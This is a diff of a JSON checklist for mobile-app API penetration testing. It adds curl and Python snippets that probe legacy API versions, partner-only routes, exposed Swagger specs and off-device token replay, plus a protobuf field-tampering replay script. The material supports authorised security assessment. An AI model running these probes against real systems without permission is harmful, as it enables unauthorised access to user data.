    "ruled_out_when": "No `io.grpc` classes, no `/pkg.Service/Method` strings, and no HTTP/2 flows to a\nnon-REST path in the pcap. Reflection disabled *and* every recovered method rejecting a low-privilege token\nwith a consistent `PERMISSION_DENIED` is the positive negative."
@@ -469,13 +503,18 @@
     "attack": [],
     "vrt": []
    },
-   "xrefs": [],
-   "domain_refs": [],
-   "has_code": false,
+   "xrefs": [
+    "D01-066",
+    "D15-024"
+   ],
+   "domain_refs": [
+    "D01"
+   ],
+   "has_code": true,
    "skip_when": "",
-   "test": "Protobuf is self-describing enough to decode blind: each field is `(field_number << 3) | wire_type`\nand the wire type tells the parser how many bytes to consume, so unknown fields can always be skipped. The\nbinary encoding is not a security boundary and the report should say so explicitly.",
-   "how": "Install the Blackbox Protobuf Burp extension (Jython) or its mitmproxy addon; it renders the message\nas an editable tree and re-encodes on send. Wire types: `0 VARINT` (int/bool/enum), `1 I64`, `2 LEN`\n(string/bytes/submessage/packed), `5 I32` (`3`/`4` are deprecated groups).",
-   "proof": "A modified field — the varint carrying `quantity`, the LEN field carrying a user id — accepted by\nthe server with a changed response.",
+   "test": "**Owner: D01-066** (blind protobuf editing, P2); this item adds the scripted, flow-driven replay. Protobuf is self-describing enough to decode blind: each field is `(field_number << 3) | wire_type`\nand the wire type tells the parser how many bytes to consume, so unknown fields can always be skipped. The\nbinary encoding is not a security boundary and the report should say so explicitly.",
+   "how": "Script it from the captured flows — blackboxprotobuf as a library, no Jython; the Burp extension\nis an optional UI on top. Wire types: `0 VARINT` (int/bool/enum), `1 I64`, `2 LEN` (string/bytes/submessage/\npacked), `5 I32` (`3`/`4` are deprecated groups).\n```bash\npip install bbpb mitmproxy requests\npython3 - <<'PY'\nimport blackboxprotobuf as bbp, requests, sys\nfrom mitmproxy.io import FlowReader\nflows = [f for f in FlowReader(open('flows.mitm', 'rb')).stream()\n         if f.request.headers.get('content-type', '').startswith(('application/x-protobuf', 'application/protobuf', 'application/grpc'))]\nf = flows[int(sys.argv[1]) if len(sys.argv) > 1 else 0]\nmsg, typedef = bbp.decode_message(f.request.content)\nprint('fields:', typedef)\nH = {k: v for k, v in f.request.headers.items() if k.lower() not in ('content-length',)}\ndef send(body, label):\n    r = requests.post(f.request.url, data=body, headers=H, timeout=20)\n    print(f'{label:<18}{r.status_code} {len(r.content)}')\nsend(f.request.content, 'verbatim')                                   # positive control\nsend(b'\\xff\\xff', 'malformed')                                       # negative control (layer ordering, D15-024)\nfor k in list(msg):\n    m = dict(msg); m.pop(k); send(bbp.encode_message(m, typedef), f'strip field {k}')\nPY\n```\nRe-send with the app's exact `Content-Type` **and** `Content-Encoding` (a gzip body without its header is\nrejected by the decoder before auth runs — D15-024).",
+   "proof": "The three-row control (verbatim 200 / malformed 4xx / strip-field delta) precedes any claim about\na field; then a modified field — the varint carrying `quantity`, the LEN field carrying a user id — accepted\nby the server with a changed response.",
    "escalation": "Apply mass assignment by *adding* an unknown field number: `proto3` servers ignore unknown\nfields, but permissive JSON-transcoding gateways may not.",
    "ruled_out_when": "The body is not protobuf (no varint-consistent parse), or every tampered field produces a\nserver-recomputed result read back with a separate call."
   },
@@ -494,8 +533,10 @@
     "AM-01"
    ],
    "applies_to": "all",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "API9:2023 (the documented scenario is a beta environment without rate limiting enabling password-reset brute force)",
    "record": "",
    "legacy_meta": {},
@@ -510,14 +551,19 @@
      "cloud_security.misconfigured_services_and_apis.insecure_api_endpoints"
     ]
    },
-   "xrefs": [],
+   "xrefs": [
+    "D01-063",
+    "D01-071",
+    "D15-092"
+   ],
    "domain_refs": [
+    "D01",
     "D18"
    ],
    "has_code": true,
    "skip_when": "",
-   "test": "Find every host the client knows about, not just the one it uses. Staging backends are the classic\nAPI9 finding: same data, weaker controls, and no WAF.",
-   "how": "```bash\n  apktool d -f -o $DEC/apktool base.apk\n  grep -rhoE 'https?://[A-Za-z0-9._-]+(:[0-9]+)?' $DEC/apktool/res $DEC/apktool/assets $S \\\n    | sed 's#\\(https\\?://[^/]*\\).*#\\1#' | sort | uniq -c | sort -rn | head -60\n  grep -rn 'BuildConfig' $S | grep -iE 'url|host|endpoint|env|stag|dev|qa|test'\n  grep -rn 'BASE_URL\\|API_URL\\|ENDPOINT' $S | head -40\n  apkleaks -f base.apk --json -o apkleaks.json\n  apkurlgrep -a base.apk | sort -u > urlgrep.txt\n  comm -23 <(sort -u urlgrep.txt) <(sort -u endpoints.txt)   # paths from a second HTTP stack\n```",
+   "test": "**Owner: D01-063 and D01-071** (P2 host inventory and non-production hosts); load `hosts.csv` when P2 ran — this is the P6 consumer, and D15-092 asks what *selects* a host. Find every host the client knows about, not just the one it uses. Staging backends are the classic\nAPI9 finding: same data, weaker controls, and no WAF.",
+   "how": "```bash\n  [ -d \"$A\" ] || apktool d -f -o \"$A\" base.apk                            # P3 normally did this\n  grep -rhoE 'https?://[A-Za-z0-9._-]+(:[0-9]+)?' \"$A/res\" \"$A/assets\" \"$S\" \\\n    | sed 's#\\(https\\?://[^/]*\\).*#\\1#' | sort | uniq -c | sort -rn | head -60\n  grep -rn 'BuildConfig' $S | grep -iE 'url|host|endpoint|env|stag|dev|qa|test'\n  grep -rn 'BASE_URL\\|API_URL\\|ENDPOINT' $S | head -40\n  apkleaks -f base.apk --json -o apkleaks.json\n  apkurlgrep -a base.apk | sort -u > urlgrep.txt\n  comm -23 <(sort -u urlgrep.txt) <(sort -u endpoints.txt)   # paths from a second HTTP stack\n```",
    "proof": "A host list with at least one non-production entry, then a `curl` to that host returning an\napplication response (not a parked page), and — the actual finding — production credentials or\nproduction-shaped data being accepted there.",
    "escalation": "Test the staging host with the *production* account token. If it accepts it, every control\ngap there becomes a production account risk, and key reuse across environments is `cryptographic_weakness.key_reuse.inter_environment` (P2). → D18.",
    "ruled_out_when": "Every recovered host resolves to production or to a dead name (NXDOMAIN / connection\nrefused / a parked page with no application response), and the non-production ones reject production tokens."
@@ -558,13 +604,16 @@
     ]
    },
    "xrefs": [
+    "D01-069",
     "D15-001",
     "D15-046"
    ],
-   "domain_refs": [],
+   "domain_refs": [
+    "D01"
+   ],
    "has_code": true,
    "skip_when": "",
-   "test": "The single highest-value structural idea in a mobile engagement. Mobile clients get endpoints the\nweb app does not — bulk sync, device registration, receipt validation, offline reconciliation, feature flags,\ntelemetry — and those endpoints have had far fewer eyes on them. Diff the two sets and attack the difference.",
+   "test": "**Owner: D01-069** (P2); load its diff when P2 ran — this is the P6 consumer. The single highest-value structural idea in a mobile engagement. Mobile clients get endpoints the\nweb app does not — bulk sync, device registration, receipt validation, offline reconciliation, feature flags,\ntelemetry — and those endpoints have had far fewer eyes on them. Diff the two sets and attack the difference.",
    "how": "```bash\n  # mobile set from D15-001/-007; web set by browsing the web app through Burp and harvesting /api/ paths from JS\n  comm -23 <(sort -u mobile_routes.txt) <(sort -u web_routes.txt) > mobile_only.txt\n  while read -r p; do\n    printf '%s ' \"$p\"\n    curl -s -o /dev/null -w '%{http_code} ' -H \"Authorization: Bearer $TOKEN_LOW\" \"https://api.target$p\"\n    curl -s -o /dev/null -w '%{http_code}\\n' \"https://api.target$p\"        # and with no token at all\n  done < mobile_only.txt\n```\nFor each mobile-only route ask the four behavioural questions, not the shape question: does it take a\nfilter/scope parameter; does it paginate; does it enforce the same authz as its web sibling; does it return\nfields the web sibling redacts.",
    "proof": "A mobile-only route returning fields or record counts the web equivalent redacts or paginates,\ncaptured side by side with the web request. **A route difference alone is Informational** — the weakened\ncontrol is the finding.",
    "escalation": "Bulk-sync endpoints (D15-046) are the recurring Critical here, and they are also the best\nrate-limit and enumeration targets: one call per thousand records.",
@@ -605,13 +654,14 @@
     ]
    },
    "xrefs": [
+    "D15-001",
     "D15-014"
    ],
    "domain_refs": [],
    "has_code": true,
    "skip_when": "",
    "test": "Mobile backends accumulate versions because old installs must keep working, and the old version is\nthe one with the original, weaker authorisation code. Diff **behaviour** across versions for the *same\noperation* on four axes: auth strength, rate limiting, input validation, field exposure.",
-   "how": "```bash\n  grep -oE '\"(v[0-9]+(\\.[0-9]+)?|[0-9]+\\.[0-9]+)/' endpoints.txt | sort -u\n  for V in v1 v2 v3 v4 1.0 2.0 3.0 beta alpha internal legacy old; do\n    code=$(curl -s -o /tmp/r.json -w '%{http_code}' -H \"Authorization: Bearer $TOKEN\" \\\n      \"https://api.example.com/$V/users/$OTHER_ID/profile\")\n    printf '%-8s %s %s\\n' \"$V\" \"$code\" \"$(wc -c < /tmp/r.json)\"\n  done\n  curl -s -H \"X-API-Version: 1\" https://api.example.com/users\n  curl -s -H \"Accept: application/vnd.company.v1+json\" https://api.example.com/users\n  for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do\n    curl -s -o /dev/null -w \"%{http_code} $sub\\n\" \"https://$sub.example.com/\"\n  done\n```",
+   "how": "```bash\n  grep -oE '^(v[0-9]+(\\.[0-9]+)?|[0-9]+\\.[0-9]+)/' endpoints.txt | sort -u   # endpoints.txt holds bare paths (D15-001)\n  for V in v1 v2 v3 v4 1.0 2.0 3.0 beta alpha internal legacy old; do\n    code=$(curl -s -o /tmp/r.json -w '%{http_code}' -H \"Authorization: Bearer $TOKEN\" \\\n      \"https://api.example.com/$V/users/$OTHER_ID/profile\")\n    printf '%-8s %s %s\\n' \"$V\" \"$code\" \"$(wc -c < /tmp/r.json)\"\n  done\n  curl -s -H \"X-API-Version: 1\" https://api.example.com/users\n  curl -s -H \"Accept: application/vnd.company.v1+json\" https://api.example.com/users\n  for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do\n    curl -s -o /dev/null -w \"%{http_code} $sub\\n\" \"https://$sub.example.com/\"\n  done\n```",
    "proof": "The same object id returning `403` on `v3` and `200` with data on `v1` — a status **and body**\ndelta on identical input with identical credentials, both captured. Anything but 404/connection-refused means\nlive; a static \"this version is deprecated\" 200 is not a finding.",
    "escalation": "Combine with the User-Agent/app-version downgrade (D15-014) to reach versions the current app\nnever calls at all.",
    "ruled_out_when": "Every neighbouring version returns 404 or a non-executing deprecation stub, **and** the\nversions that are live enforce identical auth, throttling, validation and field sets for the same operation.\nRecord the four-axis table; \"v1 returns the same JSON\" is a response-shape claim, not a behavioural one."
@@ -623,7 +673,7 @@
    "severity": "critical",
    "severity_floor": "critical",
    "severity_note": "Critical (depends on the control missing from the legacy path)",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES) / `broken_access_control.idor.*`",
+   "vrt": "`broken_access_control.privilege_escalation` (varies) / `broken_access_control.idor.*`",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-01 / AM-05",
@@ -677,12 +727,9 @@
     "AM-05"
    ],
    "applies_to": "apps with Wear/Auto/TV/Glance companions",
-   "requires": "backend-api, wear, tv, auto",
+   "requires": "backend-api",
    "requires_tags": [
-    "backend-api",
-    "wear",
-    "tv",
-    "auto"
+    "backend-api"
    ],
    "maps_to": "MASWE-0018; the \"validates the action but never the caller\" pattern",
    "record": "",
@@ -751,7 +798,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Instant apps could only use a restricted subset of APIs and permissions, so teams built\n*permission-light, frequently unauthenticated* endpoints for them. The client side is dead; the endpoints\nfrequently remain deployed and almost nobody checks them now.",
-   "how": "```bash\n  grep -rnE 'InstantApps|isInstantApp|dist:instant|dist:module|targetSandboxVersion' $S $DEC/apktool/AndroidManifest.xml\n  grep -rnE 'instant|/i/|/lite/|guest' $S | grep -iE 'http'\n  for p in $(cat instant_paths.txt); do curl -s -o /dev/null -w \"%{http_code} $p\\n\" \"https://api.target$p\"; done\n```",
+   "how": "```bash\n  grep -rnE 'InstantApps|isInstantApp|dist:instant|dist:module|targetSandboxVersion' \"$S\" \"$A/AndroidManifest.xml\"\n  grep -rnE 'instant|/i/|/lite/|guest' $S | grep -iE 'http'\n  for p in $(cat instant_paths.txt); do curl -s -o /dev/null -w \"%{http_code} $p\\n\" \"https://api.target$p\"; done\n```",
    "proof": "An unauthenticated 200 from an `/instant`-flavoured endpoint returning user or catalogue data.",
    "escalation": "Unauthenticated read of user data is a direct P1-band finding; unauthenticated *write* more so.",
    "ruled_out_when": "The manifest and history show the app never shipped an instant experience, or every\nrecovered instant path returns 404/401 with a working positive control elsewhere on the same host."
@@ -763,7 +810,7 @@
    "severity": "critical",
    "severity_floor": "critical",
    "severity_note": "Critical",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES); `server_security_misconfiguration.exposed_portal.admin_portal` (P1) when it unlocks an admin surface",
+   "vrt": "`broken_access_control.privilege_escalation` (varies); `server_security_misconfiguration.exposed_portal.admin_portal` (P1) when it unlocks an admin surface",
    "vrt_priority": "varies",
    "vrt_best": "P1",
    "attacker": "AM-05",
@@ -791,12 +838,15 @@
     ]
    },
    "xrefs": [
+    "D01-070",
     "D15-029"
    ],
-   "domain_refs": [],
+   "domain_refs": [
+    "D01"
+   ],
    "has_code": true,
    "skip_when": "",
-   "test": "Staff, driver, merchant and partner builds of the same backend expose `/admin/`, `/internal/`,\n`/ops/`, `/partner/` routes. A consumer token sometimes reaches them, because the middleware authorises\n\"authenticated\" rather than \"authorised for this role\".",
+   "test": "See also **D01-070** (the same privileged operation diffed across channel hosts, P2) — run that diff first; this item adds the sibling-APK axis. Staff, driver, merchant and partner builds of the same backend expose `/admin/`, `/internal/`,\n`/ops/`, `/partner/` routes. A consumer token sometimes reaches them, because the middleware authorises\n\"authenticated\" rather than \"authorised for this role\".",
    "how": "```bash\n  # decompile the sibling APK too, then:\n  comm -23 <(sort -u partner_routes.txt) <(sort -u consumer_routes.txt) > partner_only.txt\n  while read -r p; do\n    printf '%s -> ' \"$p\"\n    curl -s -o /dev/null -w '%{http_code}\\n' -H \"Authorization: Bearer $CONSUMER_TOKEN\" \"https://api.example.com$p\"\n  done < partner_only.txt\n```",
    "proof": "200 on a role-restricted endpoint with a token whose claims carry the lower role — show the\ndecoded token next to the response body containing privileged data.",
    "escalation": "A partner list endpoint gives you the id space for the BOLA sweep; the two combine into\n\"read/modify any account\".",
@@ -809,7 +859,7 @@
    "severity": "critical",
    "severity_floor": "support",
    "severity_note": "Critical (with the consequence); Low/Informational for the spec alone",
-   "vrt": "`cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (VARIES); the consequence rates under `broken_access_control.*`",
+   "vrt": "`cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (varies); the consequence rates under `broken_access_control.*`",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-01",
@@ -836,12 +886,15 @@
     ]
    },
    "xrefs": [
+    "D01-073",
     "D15-065"
    ],
-   "domain_refs": [],
+   "domain_refs": [
+    "D01"
+   ],
    "has_code": true,
    "skip_when": "",
-   "test": "The spec discloses every endpoint, method, parameter name/type/format/max-length, model and\nvalidation rule — it is the mass-assignment wordlist and the BOLA target list in one file. A deprecated\nversion's spec often stays indexed after the live link is removed, which is how you find zombie endpoints.",
+   "test": "**Owner: D01-073** (P2 archived-spec sweep); load its output when P2 ran — this is the P6 consumer. The spec discloses every endpoint, method, parameter name/type/format/max-length, model and\nvalidation rule — it is the mass-assignment wordlist and the BOLA target list in one file. A deprecated\nversion's spec often stays indexed after the live link is removed, which is how you find zombie endpoints.",
    "how": "```bash\n  for path in swagger swagger/v1/swagger.json swagger-ui.html api-docs api-docs.json v2/api-docs v3/api-docs \\\n              openapi.json .well-known/openapi.json swagger-resources docs redoc q/openapi nswag; do\n    curl -s -o /dev/null -w \"%{http_code} /$path\\n\" \"https://$TARGET/$path\"\n  done\n  curl -s \"http://web.archive.org/cdx/search/cdx?url=$TARGET/*swagger*&output=json&collapse=urlkey\"\n  jq -r '.paths | keys[]' v1-swagger.json | sort > /tmp/v1_paths.txt\n  jq -r '.paths | keys[]' v2-swagger.json | sort > /tmp/v2_paths.txt\n  comm -23 /tmp/v1_paths.txt /tmp/v2_paths.txt          # v1-only -> forgotten-but-live candidates\n  jq '.components.schemas' swagger.json                 # every model field, verbatim, for D15-065\n```\nFlag 200 + `Content-Type: application/json` + a body matching `\"swagger\"` or `\"openapi\"`. `kiterunner` eats\nOpenAPI natively; `sj` (Swagger Jacker) and `apidetector` automate the probe.",
    "proof": "The spec **plus a consequence**: an endpoint reachable from your session with privileges it should\nnot have. The canonical case is a spec documenting `/api/admin/users/{id}/reset-password` whose controller is\nmissing `[Authorize(Roles=\"Admin\")]`. A route documented only in an old spec must **execute**, not just\nreturn a deprecation stub.",
    "escalation": "`jq '.paths | keys' swagger.json` → the BOLA sweep and the hidden `/internal/*`, `/debug/*`,\n`/v0/*`, `/legacy/*` routes no UI references and no WAF rule covers. Where Swagger UI itself is exposed, test\n`?configUrl=` and `?url=` for spec injection (CVE-2018-25031 affects Swagger UI ≤ 4.1.2; CVE-2023-38337 is\n`rswag` directory traversal) — a victim's \"Try It Out\" click then fires same-origin authenticated requests.",
@@ -976,6 +1029,8 @@
     ]
    },
    "xrefs": [
+    "D13-010",
+    "D13-011",
     "D15-005",
     "D15-027"
    ],
@@ -989,11 +1044,11 @@
    ],
    "has_code": true,
    "skip_when": "",
-   "test": "The single highest-value mobile auth check and it takes two minutes. Take the exact `Authorization`\nvalue the app sends, move it to a different machine, IP and user-agent, and see whether the server still\nhonours it. Vendors routinely describe tokens as device-bound because the *client* attaches a device id —\nwhich is not binding at all, because you can echo it too.",
+   "test": "**Owned by D13-010** (and D13-011 when DPoP is declared): this item is the D15 gate that consumes\nthat verdict — run it once, record `token works off-device: yes|no` in this item's tracker row (every leak\nfinding cites it as an amplifier), and never score it twice. The single highest-value mobile auth check and it takes two minutes. Take the exact `Authorization`\nvalue the app sends, move it to a different machine, IP and user-agent, and see whether the server still\nhonours it. Vendors routinely describe tokens as device-bound because the *client* attaches a device id —\nwhich is not binding at all, because you can echo it too.",
    "how": "```bash\n  curl -sS -i 'https://api.example.com/v2/me' -H \"Authorization: Bearer $TOKEN\"\n  # then add back, one at a time, the headers the interceptor sets, to find which (if any) is enforced\n  curl -sS -o /dev/null -w '%{http_code}\\n' 'https://api.example.com/v2/me' \\\n       -H \"Authorization: Bearer $TOKEN\" -H \"X-Device-Id: $DEVID\"\n  curl -sS -o /dev/null -w '%{http_code}\\n' 'https://api.example.com/v2/me' \\\n       -H \"Authorization: Bearer $TOKEN\" -H \"X-Device-Id: 00000000-0000-0000-0000-000000000000\"\n```\nGenuine binding is cryptographic: a DPoP proof (RFC 9449 — `htm`, `htu`, `iat`, `jti`, `ath`, `cnf`/`jkt`),\nmTLS, or a per-request HMAC over a key the server issued and the client cannot export.",
-   "proof": "HTTP 200 with the account's data from a host that has never run the app, with no device-specific\nheader or with the device header set to an arbitrary value. Capture the full response.",
+   "proof": "HTTP 200 with the account's data from a host that has never run the app, with no device-specific\nheader or with the device header set to an arbitrary value. Capture the full response. **Only a finding\nwhen binding is claimed.** If the bearer is minted by the platform account manager or by a documented\nbearer-token OAuth flow that never claims sender constraint, the 200 is expected: record it under\nthe tracker row as an amplifier (it removes every \"requires the device\" caveat from leak findings) and do not\nfile it.",
    "escalation": "Everything. Once the token works from curl the whole sweep is scriptable; and a leaked token\nfrom D07/D09/D10/D11/D20 that works from anywhere is straightforward account takeover (→ D13).",
-   "ruled_out_when": "Removing or altering the device header produces a 401 **with a different body**, *and*\nthe mechanism is cryptographic rather than an echoed value — read the interceptor (D15-005) to confirm the\nclient cannot itself produce the proof for an arbitrary device id. A short-lived bot-management cookie\nfailing from curl is a harness artefact, not binding (D15-027)."
+   "ruled_out_when": "Removing or altering the device header produces a 401 **with a different body**, *and*\nthe mechanism is cryptographic rather than an echoed value — read the interceptor (D15-005) to confirm the\nclient cannot itself produce the proof for an arbitrary device id. A short-lived bot-management cookie\nfailing from curl is a harness artefact, not binding (D15-027).\n…or the token's issuer documents it as a plain bearer — then the item is an amplifier record, not a finding."
   },
   {
    "id": "D15-022",
@@ -1014,7 +1069,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "field methodology (`hunt-spa-api` step 3)",
+   "maps_to": "API2:2023; OWASP WSTG-ATHZ-02 (a control response before any unauthenticated claim)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1090,7 +1145,7 @@
   {
    "id": "D15-024",
    "domain": "D15",
-   "title": "THE LAYER-ORDERING TRAP — a validation error does NOT prove you passed auth",
+   "title": "THE LAYER-ORDERING TRAP at the API — a validation error does NOT prove you passed auth",
    "severity": "support",
    "severity_floor": "support",
    "severity_note": "Support (a kill gate)",
@@ -1106,7 +1161,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "field methodology (`triage-validation` \"THE LAYER-ORDERING TRAP\")",
+   "maps_to": "API2:2023; the same gate as D01-078 (P2 phase), applied here to every authz claim",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1118,12 +1173,17 @@
     "attack": [],
     "vrt": []
    },
-   "xrefs": [],
-   "domain_refs": [],
+   "xrefs": [
+    "D01-078",
+    "D15-010"
+   ],
+   "domain_refs": [
+    "D01"
+   ],
    "has_code": true,
    "skip_when": "",
-   "test": "The highest-confidence false positive in the entire auth-bypass class. Many stacks put a global\ninput sanitiser, body parser or schema filter *in front of* the auth middleware, so a malformed body is\nrejected before auth is ever consulted — and the response is indistinguishable from \"auth passed, validation\nfailed\". Re-test with a minimal **well-formed** body before claiming anything.",
-   "how": "```bash\n  curl -s -i -X POST https://target/api/v1/resource -d '{'\n  # 400 {\"code\":\"ERR-INPUT-0001\",\"message\":\"Invalid text. Only permitted characters are allowed\"}  <- looks like auth bypass\n  curl -s -i -X POST https://target/api/v1/resource -H 'Content-Type: application/json' -d '{}'\n  # 401 {\"code\":\"ERR-AUTH-0001\",\"message\":\"Not authenticated. Please log in.\"}\n```",
+   "test": "**Gate owned by D01-078** (P2); applied again here to every authz claim so the discipline exists once. The highest-confidence false positive in the entire auth-bypass class. Many stacks put a global\ninput sanitiser, body parser or schema filter *in front of* the auth middleware, so a malformed body is\nrejected before auth is ever consulted — and the response is indistinguishable from \"auth passed, validation\nfailed\". Re-test with a minimal **well-formed** body before claiming anything. The same trap applies to\ntransport encoding: a gzip or protobuf decoder that rejects the body answers before the auth filter. Use\nthe captured body verbatim with its original `Content-Type` and `Content-Encoding`; the D15-010 script's\nverbatim / malformed rows are this control.",
+   "how": "```bash\n  curl -s -i -X POST https://target/api/v1/resource -d '{'\n  # 400 {\"code\":\"ERR-INPUT-0001\",\"message\":\"Invalid text. Only permitted characters are allowed\"}  <- looks like auth bypass\n  curl -s -i -X POST https://target/api/v1/resource -H 'Content-Type: application/json' -d '{}'\n  # 401 {\"code\":\"ERR-AUTH-0001\",\"message\":\"Not authenticated. Please log in.\"}\n  # encoding layer: the decoder sits in front of auth too — re-send with the app's EXACT Content-Type and Content-Encoding\n  curl -s -i -X POST \"$URL\" -H 'Content-Type: application/x-protobuf' --data-binary @body.bin                              # 400 = decoder/gzip layer, NOT auth\n  curl -s -i -X POST \"$URL\" -H 'Content-Type: application/x-protobuf' -H 'Content-Encoding: gzip' --data-binary @body.bin.gz   # the only reading that counts\n```",
    "proof": "Only the second response tells you where the auth layer sits. If the error text is about **input\nshape or character class**, you are talking to a parser, not business logic. If it names a **domain field**\n(`accountId is required`) *and* a well-formed `{}` still returns it, that is real signal.",
    "escalation": "n/a — this is a kill gate. It applies equally to WAF/CDN layers: an edge block is not an\norigin response.",
    "ruled_out_when": "The well-formed `{}` request returns 401/403. Then the route is gated and the validation\nerror you saw was a parser in front of the auth layer. Record it; do not file it."
@@ -1147,7 +1207,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "field methodology (local android-pentest reference 24 §B1)",
+   "maps_to": "methodology (this chapter's discipline gates, D15-025 … D15-033); PortSwigger \"Smashing the state machine\" (sample before any timing or race claim)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1159,12 +1219,14 @@
     "attack": [],
     "vrt": []
    },
-   "xrefs": [],
+   "xrefs": [
+    "D15-033"
+   ],
    "domain_refs": [],
    "has_code": true,
    "skip_when": "",
    "test": "Before drawing any conclusion from a response difference, establish the endpoint's baseline\nvariability. This is the single largest false-positive generator in API differential testing: an endpoint\nreturning an unordered collection can produce identical content, identical byte length and a different hash\non every call. The corpus's real case manufactured ~20 phantom \"anomalies\" in one injection sweep.",
-   "how": "```bash\n  for i in 1 2 3 4 5 6; do\n    curl -s -X POST \"$URL\" -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\\n      -d \"$BODY\" | tee /tmp/r$i.json | md5\n  done\n  diff <(jq -S . /tmp/r1.json) <(jq -S . /tmp/r2.json)\n  norm(){ jq -S 'walk(if type==\"array\" then sort else . end)\n          | del(.requestId,.timestamp,.traceId,.serverTime)' \"$1\"; }\n  diff <(norm /tmp/r1.json) <(norm /tmp/r2.json)\n```",
+   "how": "```bash\n  for i in 1 2 3 4 5 6; do\n    curl -s -X POST \"$URL\" -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\\n      -d \"$BODY\" | tee /tmp/r$i.json | openssl dgst -md5 | awk '{print $NF}'   # md5/md5sum differ per host\n  done\n  diff <(jq -S . /tmp/r1.json) <(jq -S . /tmp/r2.json)\n  norm(){ jq -S 'walk(if type==\"array\" then sort else . end)\n          | del(.requestId,.timestamp,.traceId,.serverTime)' \"$1\"; }\n  diff <(norm /tmp/r1.json) <(norm /tmp/r2.json)\n```",
    "proof": "Six identical requests producing six identical *normalised* outputs, recorded in the report — that\nfact is what licenses every later differential claim.",
    "escalation": "Use the **same** normaliser across every harness in the engagement; two tools with different\nnormalisation will disagree and you will chase the difference.",
    "ruled_out_when": "n/a — a gate. If the endpoint is non-deterministic and you cannot normalise it, say so\nand compare parsed structures rather than bytes."
@@ -1188,7 +1250,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "field methodology (reference 24 §B2)",
+   "maps_to": "methodology (this chapter's discipline gates); OWASP WSTG-ERRH-01 (error handling as an oracle)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1205,7 +1267,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Measure how the endpoint responds to a spectrum of *non-payload* inputs before sending a single\ninjection payload: **valid · absent · empty · wrong-length garbage · right-length garbage · quote-broken ·\nvalid+quote · type-confused**. If every invalid variant returns a byte-identical response, the lookup is an\nexact match on an indexed/hashed key with no error propagation — injection there is **structurally ruled\nout**, and no quantity of payloads changes that.",
-   "how": "```bash\n  for v in \"$VALID\" \"\" \"zzz\" \"$(printf 'a%.0s' $(seq 1 ${#VALID}))\" \"'\" \"${VALID}'\" \"[]\" \"true\"; do\n    printf '%-24s ' \"${v:0:24}\"\n    enc=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' \"$v\")\n    curl -s -o /tmp/o -w '%{http_code} %{size_download} ' \"$URL?id=$enc\" -H \"Authorization: Bearer $TOKEN\"\n    md5 < /tmp/o\n  done\n```",
+   "how": "```bash\n  for v in \"$VALID\" \"\" \"zzz\" \"$(printf 'a%.0s' $(seq 1 ${#VALID}))\" \"'\" \"${VALID}'\" \"[]\" \"true\"; do\n    printf '%-24s ' \"${v:0:24}\"\n    enc=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' \"$v\")\n    curl -s -o /tmp/o -w '%{http_code} %{size_download} ' \"$URL?id=$enc\" -H \"Authorization: Bearer $TOKEN\"\n    openssl dgst -md5 < /tmp/o | awk '{print $NF}'\n  done\n```",
    "proof": "Either (a) a table of byte-identical responses — a defensible, evidenced **negative** for the\nruled-out register; or (b) a differential, which is your oracle and makes subsequent injection testing\nmeaningful.",
    "escalation": "With an oracle established, escalate to blind/time-based techniques knowing the channel\nexists. Without one, redirect effort to authorisation, business logic and races — which typed validation does\nnot protect.",
    "ruled_out_when": "All eight variants return a byte-identical normalised response **and** a positive control\nrequest on the same endpoint succeeds (so you are reading the validation layer, not an outage)."
@@ -1229,7 +1291,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "field methodology (reference 24 §B3)",
+   "maps_to": "methodology (this chapter's discipline gates); OWASP WSTG-INPV category (a validation signature is a parser-layer answer — D15-024)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1242,6 +1304,7 @@
     "vrt": []
    },
    "xrefs": [
+    "D15-024",
     "D15-034"
    ],
    "domain_refs": [],
@@ -1273,7 +1336,7 @@
     "backend-api",
     "mitm"
    ],
-   "maps_to": "field methodology (reference 24 §B4)",
+   "maps_to": "methodology (this chapter's discipline gates); D27 (evidence attribution per layer)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1286,7 +1349,9 @@
     "vrt": []
    },
    "xrefs": [],
-   "domain_refs": [],
+   "domain_refs": [
+    "D27"
+   ],
    "has_code": false,
    "skip_when": "",
    "test": "Four specific misreads that look like application behaviour:\n- **Zero-byte body + 4xx** (md5 `d41d8cd98f00b204e9800998ecf8427e`, the md5 of the empty string) → edge or\n  protocol rejection. **HTTP header values are ISO-8859-1**; fullwidth/unicode payloads die at the proxy and\n  never reach the app.\n- **Stale bot-management cookie** (`__cf_bm` and friends) → *every* request returns a uniform 401/403\n  indistinguishable from a revoked session. Re-pull the jar from the device and re-test.\n- **Duplicate cookies** — the WebView `Cookies` DB holds both `host` and `.host` rows; naively joining them\n  sends the same name twice and yields 400s that look like server behaviour. Dedupe, preferring the\n  exact-host row.\n- **429 means stop.** It is not an injection signal, and **it poisons every differential collected after it.**",
@@ -1314,7 +1379,7 @@
    "requires_tags": [
     "backend-api"
    ],
